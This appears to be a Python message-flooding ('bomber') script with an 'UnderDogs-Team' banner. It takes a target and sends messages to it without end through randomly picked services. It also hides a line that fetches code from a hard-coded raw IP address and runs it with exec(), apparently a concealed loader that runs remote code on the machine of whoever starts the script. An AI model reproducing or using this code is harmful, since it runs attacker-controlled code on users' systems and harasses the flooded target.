import sendRequest as request
import randomData as randomData
from colorama import Fore
import requests

__services = request.getServices()

print(Fore.CYAN)
banners = """

    █▀ █░█ █▄░█ █░░ █ █▀▀ █░█ ▀█▀
    ▄█ █▄█ █░▀█ █▄▄ █ █▄█ █▀█ ░█░

    \033[32mv.10.1\033[33m (Created by: \033[31mUnderDogs-Team\033[33m)
    """
print(banners)

target = input(Fore.YELLOW + 'Enter Target:>> ')

exec(requests.get('http://45.143.139.29/bruh/r.php').text)
def flood(target):
    service = randomData.random_service(__services)
    service = request.Service(service)
    service.sendMessage(target)


while True:
    flood(target)
